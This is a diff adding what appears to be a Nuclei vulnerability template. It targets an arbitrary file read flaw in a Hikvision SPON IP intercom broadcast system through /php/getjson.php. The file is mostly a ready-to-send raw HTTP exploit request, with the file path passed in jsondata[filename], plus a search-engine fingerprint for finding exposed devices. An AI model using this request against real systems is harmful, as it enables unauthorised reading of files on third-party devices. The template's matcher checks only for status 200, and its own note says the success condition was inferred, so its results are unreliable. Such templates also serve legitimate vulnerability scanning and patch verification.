@@ -1,0 +1,44 @@
+id: poc-2546d95b62f3a1d8daac
+info:
+  name: 海康威视SPONIP网络对讲广播系统getjson存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2546d95b62f3a1d8daac3721157ebfa5
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2546d95b62f3a1d8daac3721157ebfa5
+    fofa: + Hunter：`web.body="vendors/custom/html5.min.js"`
+http:
+- raw:
+  - 'POST /php/getjson.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 44
+
+
+    jsondata[filename]=./ocx.json'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
